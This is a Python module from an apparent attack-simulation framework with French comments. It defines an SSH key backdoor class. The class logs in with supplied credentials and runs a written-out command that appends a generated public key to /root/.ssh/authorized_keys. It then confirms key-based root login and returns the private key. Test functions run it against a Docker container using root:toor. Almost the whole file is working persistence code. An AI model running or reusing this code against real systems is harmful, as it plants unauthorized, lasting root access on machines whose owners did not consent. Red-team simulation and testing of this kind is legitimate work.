#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed Apr 29 11:54:51 2026

@author: hounsousamuel
"""

import os, sys, io
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", "..", ".."))))

import time
import asyncio
import threading
import paramiko
import socket
import json
import uuid
import subprocess
import tempfile
from simulateur_attaque_ia.tactics.execution.command_execution import CommandExecution
from simulateur_attaque_ia.tactics.mittres import MITRE
from simulateur_attaque_ia.simulateur_utils.logger import get_logger

logger = get_logger()

class SSHKeyBackdoor(CommandExecution):
    def __init__(
        self,
        name:str = "ssh_key_backdoor",
        timeout:int = 2, 
        exec_timeout:int = 5,
        **kwargs
    ):
        """
        Méthode d'instanciation.

        Parameters
        ----------
        name : str, optional
            Nom a dommé a la classe. The default is "ssh_key_backdoor".
        timeout : int, optional
            Timeout de connexion. The default is 2.
        exec_timeout : int, optional
            Timeout d'éxécution. The default is 5.
        **kwargs : dict
            Autre options.

        Returns
        -------
        None.

        """
        super().__init__(name=name, timeout=timeout, exec_timeout=exec_timeout)
        self.ssh_results = {
            "success": False,
            "public_key": None,
            "private_key": False
        }
    
    def get_list_algo(self):
        return [
            "Ed25519",
            "RSA",
            "ECDSA",
            # "DSA"
        ]
    
    @classmethod
    def map_algo(cls, algo: str = "Ed25519"):
        algo = algo.lower()
        if algo in ("ed25519", "openssh"):
            return paramiko.Ed25519Key
        
        elif algo == "rsa":
            return paramiko.RSAKey
        
        # elif algo == "dsa":
        #     return paramiko.DSSKey
        
        elif algo == "ecdsa":
            return paramiko.ECDSAKey
        
        return paramiko.Ed25519Key
    
    def gen_key(self, algo: str = "Ed25519"):
        if algo.upper() == "ECDSA":
            key = paramiko.ECDSAKey.generate()
            public_key = f"ecdsa-sha2-nistp256 {key.get_base64()} shieldai@backdoor"
            f = io.StringIO()
            key.write_private_key(f)
            return public_key, key, f.getvalue()          
    
        elif algo.lower() == "ed25519":
            tmp_path = f"/tmp/shieldai_ed25519_{uuid.uuid4().hex}"
            try:
                subprocess.run(
                    ["ssh-keygen", "-t", "ed25519", "-f", tmp_path, "-N", "", "-q"],
                    capture_output=True, check=True
                )
                with open(tmp_path, "r") as f:
                    key_content = f.read()    
                with open(f"{tmp_path}.pub", "r") as f:
                    public_key = f.read().strip()
                key = paramiko.Ed25519Key.from_private_key(io.StringIO(key_content))
                return public_key, key, key_content       
    
            except Exception:
                key = paramiko.RSAKey.generate(2048)
                public_key = f"ssh-rsa {key.get_base64()} shieldai@backdoor"
                f = io.StringIO()
                key.write_private_key(f)
                return public_key, key, f.getvalue()
    
            finally:
                for p in [tmp_path, f"{tmp_path}.pub"]:
                    try:
                        os.remove(p)
                    except Exception:
                        pass
    
        else:  # RSA et autres
            key = self.map_algo(algo).generate(2048)
            public_key = f"ssh-rsa {key.get_base64()} shieldai@backdoor"
            f = io.StringIO()
            key.write_private_key(f)
            return public_key, key, f.getvalue()     
    
    def __try_connect(
        self,
        ip:str,
        port:int,
        username:str,
        key
    ) -> bool:
        """
        Méthode qui vérifie si les crédentials sont corrects.

        Parameters
        ----------
        ip : str
            L'IP.
        port : int
            Le port.
        username : str
            L'username ssh.
        key : paramiko key
            La clé ssh.
      
        Returns
        -------
        bool
            True/False selon succès/echec.

        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # print(key)
        try:
            client.connect(
                hostname=ip,
                port=port,
                username=username,
                pkey=key,
                timeout=self.timeout
            )
            self.log(f"✅ SUCCESS: {username}:{type(key).__name__}", log=True)
            return True
        
        except paramiko.AuthenticationException:
            self.log(f"❌ FAIL: {username}:{type(key).__name__}", log=True)
            return False
        
        except socket.timeout:
            return False
        
        except paramiko.SSHException:
            return False
        
        except (paramiko.ssh_exception.NoValidConnectionsError, ConnectionRefusedError):
            return False
        
        except Exception as e:
            self.log(f"⚠️ ERROR: {e}", log=True)
            return False
        
        finally:
            client.close()  
    
    def get_commands(self, public_key:str) -> list:
        return [
        f"mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '{public_key}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
    ]
    
    async def inject_key_async(
        self, ip:str, 
        port:int = 22,
        username:str = "", 
        password:str = "", 
        algo:str = "Ed25519",
        pkey=None
    ) -> dict:
        """
        Méthode d'injection de la clé ssh.

        Parameters
        ----------
        ip : str
            L'IP.
        port : int, optional
            Le port. The default is 22.
        username : str, optional
            L'username. The default is "".
        password : str, optional
            Le password (mot de passe). The default is "".
        algo : str, optional
            Algorithme de génération de la clé. The default is "Ed25519".

        Returns
        -------
        dict
            Le résultat.

        """
        try:
            self.log(f"Début SSH Key Backdoor à : {time.ctime()}, pour ip : {ip} et port {port} ", log=True)
            self.log(f"Username: {username}, Password: {password}", log=True)
            self.start_time = time.time()
            public_key, key, pem_str = self.gen_key(algo=algo)
            commands = self.get_commands(public_key=public_key)
            c_str = '\n- '.join(commands)
            self.log(f"{len(commands)} à exécuter !\nCommandes: {c_str}", log=True)
            c_results = await self.exec_command_async(
                ip=ip,
                port=port,
                username=username,
                password=password,
                commands=commands,
                add_common=False,
                pkey=pkey
            )
            results = c_results.get("results",{})
            if results.get("success_rate", None)  == 1 and results.get("success_number", None) == len(commands):
                self.ssh_results["success"] = self.__try_connect(
                    ip=ip,
                    port=port,
                    username=username,
                    key=key
                )
                self.ssh_results["private_key"] = key #str(key)
                self.ssh_results["public_key"] = public_key #str(public_key)
                self.ssh_results["private_key_pem"] = pem_str
            else:
                logger.print("Commande Injection result : \n")
                logger.print(json.dumps(c_results, indent=2, ensure_ascii=False), verify=False)
                self.log("ECHEC !", log=True)
                
        except Exception as e:
            self.log("Erreur dans l'injection de la clé ssh:\nErreur :", str(e))
            # import traceback
            # traceback.print_exc()
        
        finally:
            self.end_time = time.time()
            self.log(f"Fin SSH Key Backdoor, success={self.ssh_results['success']}!", log=True)
            return self.ssh_get_result()
    
    def inject_key_sync(self, *args, **kwargs):
        """Version synchrone de inject_key_async"""
        return asyncio.run(self.inject_key_async(*args, **kwargs))
    
    def ssh_get_result(self) -> dict:
        self.save()
    
        pkey_str = self.ssh_results.get("private_key_pem", None)
    
        if pkey_str is None:
            pkey = self.ssh_results.get("private_key", None)
            if pkey is not None and not isinstance(pkey, str):
                try:
                    f = io.StringIO()
                    pkey.write_private_key(f)
                    pkey_str = f.getvalue()
                except Exception as e:
                    self.log(f"⚠️ Erreur sérialisation clé privée : {e}", log=True)
    
        mitres = [MITRE.get("SSHKeyBackdoor", {})]
        results = {
            'severity': 'HIGH' if self.ssh_results.get("success", False) else 'LOW',
            'elapsed':  self.end_time - self.start_time,
            "mitres":   mitres,
            'results': {
                "success":     self.ssh_results.get("success", False),
                "public_key":  self.ssh_results.get("public_key", None),
                'private_key': pkey_str,
            },
        }
        return results
            
    
def test_ssh_key_backdoor(ip: str = None, username: str = "root", password: str = "toor", pkey=None):
    """
    Test complet du SSH Key Backdoor.
    
    Args:
        ip: IP cible (ex: 172.17.0.2)
        username: Nom d'utilisateur SSH (défaut: root)
        password: Mot de passe SSH (défaut: toor)
    """
    
    logger.print("\n" + "="*60)
    logger.print("🧪 TEST SSH KEY BACKDOOR")
    logger.print("="*60)
    
    # 1. Tester différentes clés
    algorithms = ["Ed25519", "RSA"]
    
    for algo in algorithms:
        logger.print(f"\n📌 Test avec algorithme: {algo}")
        logger.print("-" * 40)
        
        backdoor = SSHKeyBackdoor(timeout=5, exec_timeout=10)
        
        result = backdoor.inject_key_sync(
            ip=ip,
            port=22,
            username=username,
            password=password,
            algo=algo, pkey=pkey
        )
        
        logger.print(f"\n📊 Résultat pour {algo}:")
        logger.print(f"  - Severity: {result.get('severity')}")
        logger.print(f"  - Elapsed: {result.get('elapsed'):.2f}s")
        logger.print(f"  - Success: {result.get('results', {}).get('success')}")
        
        if result.get('results', {}).get('public_key'):
            logger.print(f"  - Public Key: {result['results']['public_key'][:50]}...")
            logger.print(f"  - Private Key: {type(result['results']['private_key'])}")
    
    # 2. Vérification que la clé fonctionne
    logger.print("\n" + "="*60)
    logger.print("🔐 VÉRIFICATION FINALE - Connexion avec clé privée")
    logger.print("="*60)
    
    # Dernier test avec Ed25519
    final_backdoor = SSHKeyBackdoor(timeout=5, exec_timeout=10)
    result = final_backdoor.inject_key_sync(
        ip=ip,
        port=22,
        username=username,
        password=password,
        algo="Ed25519"
    )
    
    if result.get('results', {}).get('private_key'):
        private_key = result['results']['private_key']
        
        # Tester la connexion avec la clé privée injectée
        logger.print("\n🧪 Test de connexion avec la clé privée injectée...")
        try:
            # SÉCURITÉ : Si la clé privée est sous forme de chaîne de caractères, on la charge dynamiquement
            if isinstance(private_key, str):
                loaded_key = None
                for cls in (paramiko.Ed25519Key, paramiko.RSAKey, paramiko.ECDSAKey):
                    try:
                        loaded_key = cls.from_private_key(io.StringIO(private_key))
                        break
                    except Exception:
                        pass
                private_key = loaded_key

            if private_key is None:
                raise ValueError("Impossible de charger la clé privée sérialisée.")

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=ip,
                port=22,
                username=username,
                pkey=private_key, # Objet clé reconstruit utilisé pour la connexion
                timeout=5
            )
            stdin, stdout, stderr = client.exec_command("whoami")
            output = stdout.read().decode().strip()
            logger.print("✅ Connexion avec clé privée RÉUSSIE !")
            logger.print(f"   Commande exécutée: whoami → {output}")
            client.close()
            
        except Exception as e:
            logger.print(f"❌ Échec connexion avec clé privée: {e}")
    
    return result


def test_ssh_key_backdoor_with_container(docker_manager=None):
    """
    Test du SSH Key Backdoor dans l'environnement de test.
    
    Args:
        docker_manager: Instance de DockerManager (optionnel)
    """
    from tactics.tests.environment import TestEnvironment
    
    logger.print("\n" + "="*60)
    logger.print("🚀 TEST SSH KEY BACKDOOR DANS CONTAINER")
    logger.print("="*60)
    
    # Si un docker_manager est fourni, l'utiliser
    if docker_manager:
        ip = docker_manager.get_ip()
        logger.print(f"🎯 Cible: {ip}")
        return test_ssh_key_backdoor(ip=ip, username="root", password="toor")
    
    # Sinon, créer un environnement de test
    IMAGE_NAME = "shieldai_sim_atk:v2"
    CONTAINER_NAME = "shieldai_test"
    
    env = TestEnvironment(
        image_name=IMAGE_NAME,
        container_name=CONTAINER_NAME,
    )
    
    try:
        ip = env.setup()
        logger.print(f"\n🎯 IP cible prête : {ip}")
        
        # Attendre que SSH soit bien démarré
        import time
        time.sleep(2)
        
        result = test_ssh_key_backdoor(ip=ip, username="root", password="toor")
        
        # Vérifier dans le container que la clé a bien été ajoutée
        logger.print("\n📋 VÉRIFICATION DANS LE CONTAINER:")
        check_result = env.dock.exec_command("cat /root/.ssh/authorized_keys 2>/dev/null || echo 'Fichier non trouvé'")
        logger.print(f"authorized_keys:\n{check_result[0][:500]}...")
        
        return result
        
    except Exception as e:
        logger.print(f"❌ Erreur: {e}")
        import traceback
        traceback.print_exc()
        return None
    finally:
        env.teardown()


if __name__ == "__main__":
    # # Test simple sur localhost (si SSH tourne)
    # # test_ssh_key_backdoor(ip="127.0.0.1", username="testuser", password="password")
    
    # # Test avec container
    # test_ssh_key_backdoor_with_container()
    key = paramiko.RSAKey.generate(2048)
    public_key = f"ssh-rsa {key.get_base64()} shieldai@backdoor"
    print(key.key, "\n", public_key)
    print(key.get_bits())
    test_ssh_key_backdoor_with_container()
